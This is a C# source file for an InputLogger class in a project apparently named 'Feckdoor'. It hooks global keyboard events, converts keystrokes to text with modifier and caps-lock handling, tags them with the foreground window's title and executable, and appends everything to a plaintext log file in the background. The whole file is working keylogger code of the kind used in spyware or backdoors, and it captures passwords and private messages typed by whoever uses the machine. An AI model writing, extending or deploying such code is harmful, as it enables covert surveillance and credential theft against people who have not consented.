using Serilog;
using System.Diagnostics;
using System.Text;

namespace Feckdoor.InputLog
{
	public class InputLogger : IDisposable
	{
		private static ActiveWindowInfo ActiveWindowInfoCache;

		internal static readonly Queue<InputLogEntry> UndoneQueue = new();
		private readonly Stopwatch PreviousInput = new();

		private readonly Task WriterTask;

		private readonly string[] ModifierKeysString = { "CTRL", "SHIFT", "ALT", "WIN" };

		private volatile bool InputWriterRunning = true;
		private bool disposed;

		public InputLogger()
		{
			KeyboardHook.OnKeyboardInput += OnKeyboardInput;
			WriterTask = Task.Run(async () =>
			{
				while (InputWriterRunning)
				{
					if (PreviousInput.ElapsedMilliseconds > Config.TheConfig.InputLog.SaveWait && UndoneQueue.Count > 0 || UndoneQueue.Count >= Config.TheConfig.InputLog.SaveMaxUndone)
						WriteUndone(Config.TheConfig.InputLog.InputLogFile);

					await Task.Delay(Config.TheConfig.InputLog.SaveDelay);
				}

				// Final write (before shutdown)
				WriteUndone(Config.TheConfig.InputLog.InputLogFile);
			});
		}

		internal void WriteUndone(string inputLogFile)
		{
			Log.Debug("Writing input log.");

			try
			{
				var queueCopy = new List<InputLogEntry>(UndoneQueue);
				UndoneQueue.Clear();

				// current sqlite db is not supported

				using var writer = new StreamWriter(inputLogFile, true, Encoding.UTF8);
				foreach (var entry in queueCopy)
				{
					try
					{
						writer.Write(entry.PlainTextMessage);
					}
					catch (Exception e)
					{
						Log.Warning(e, "Exception during writing a input log entry.");
					}
				}
			}
			catch (Exception e)
			{
				Log.Error(e, "Exception during writing input log.");
			}
		}

		internal void OnKeyboardInput(object? sender, KeyboardInputEventArgs args)
		{
			bool capsLock = (User32.GetKeyState(0x14) & 0xffff) != 0;
			string currentKey = Vk2String(args.VkCode, args.ScanCode, args.Modifier.HasFlag(ModifierKey.Alt));

			if (Config.TheConfig.InputLog.AutoCapitalize)
				currentKey = (capsLock ^ args.Modifier.HasFlag(ModifierKey.Shift)) ? currentKey.ToUpper() : currentKey.ToLower();

			if (args.VkCodeEnum.GetVkName(args.Modifier, ref currentKey) && currentKey.Equals("CapsLock", StringComparison.OrdinalIgnoreCase))
			{
				if (capsLock)
					currentKey = "CapsLock: Off";
				else
					currentKey = "CapsLock: On";
			}

			if (Config.TheConfig.InputLog.SuppressModifierKey && ModifierKeysString.Any(key => currentKey.Equals(key, StringComparison.Ordinal)))
				return;

			// See https://www.autohotkey.com/docs/commands/Send.htm
			var modifierSet = new List<char>(4);
			if (args.Modifier.HasFlag(ModifierKey.Ctrl))
				modifierSet.Add('^');
			if (Config.TheConfig.InputLog.ShiftPrefix && args.Modifier.HasFlag(ModifierKey.Shift))
				modifierSet.Add('+');
			if (args.Modifier.HasFlag(ModifierKey.Alt))
				modifierSet.Add('!');
			if (args.Modifier.HasFlag(ModifierKey.Win))
				modifierSet.Add('#');

			if (modifierSet.Count > 0)
				currentKey = $"{string.Concat(modifierSet)}{currentKey}";

			if (ActiveWindowInfoCache != GetActiveWindowInfo())
				UndoneQueue.Enqueue(new ActiveWindowChangeEntry(DateTime.Now, ActiveWindowInfoCache));

			UndoneQueue.Enqueue(new KeyLogEntry(DateTime.Now.AddTicks(Environment.TickCount64 - args.Time), args, currentKey));

			PreviousInput.Restart();
		}

		private static string Vk2String(uint vkCode, uint scanCode, bool altDown)
		{
			try
			{
				byte[] vkBuffer = new byte[256];
				if (!User32.GetKeyboardState(vkBuffer))
					return ""; // Keyboard state unavailable

				var sb = new StringBuilder(256);
				int bufferLen = User32.ToUnicodeEx(vkCode, scanCode, vkBuffer, sb, 256, Convert.ToUInt32(altDown), User32.GetKeyboardLayout(User32.GetWindowThreadProcessId(User32.GetForegroundWindow(), out uint processId)));
				if (bufferLen != 0)
				{
					if (bufferLen < 0)
						bufferLen = int.MaxValue; // Prevent negative index access on .Take(n)
					return string.Concat(sb.ToString().Take(bufferLen)); // If unicode value of key available, return it.
				}
			}
			catch (Exception e)
			{
				Log.Warning(e, "Exception during vkCode to unicode conversion.");
			}

			// If unicode value of key unavailable or an error occurred.
			return ((VirtualKey)vkCode).ToString();
		}

		private static ActiveWindowInfo GetActiveWindowInfo()
		{
			try
			{
				// Acquire forground window handle
				IntPtr hwnd = User32.GetForegroundWindow();

				// Acquire foreground window thread id bu window id
				User32.GetWindowThreadProcessId(hwnd, out uint pid);

				// Acquire foreground process id by thread id
				var p = Process.GetProcessById((int)pid);
				ActiveWindowInfoCache = new ActiveWindowInfo { Name = p.MainWindowTitle, Executable = p.MainModule?.FileName ?? p.ProcessName };
				return ActiveWindowInfoCache;
			}
			catch (Exception e)
			{
				Log.Warning(e, "Exception during getting active window info.");
				return new ActiveWindowInfo { Name = Config.TheConfig.InputLog.FallbackWindowName, Executable = Config.TheConfig.InputLog.FallbackWindowExecutableName };
			}
		}

		protected virtual void Dispose(bool disposing)
		{
			if (!disposed)
			{
				if (disposing)
				{
					KeyboardHook.OnKeyboardInput -= OnKeyboardInput;
					InputWriterRunning = false;
					WriterTask.Wait(); // Wait until the last save finishes
				}

				disposed = true;
			}
		}

		public void Dispose()
		{
			Dispose(true);
			GC.SuppressFinalize(this);
		}
	}
}
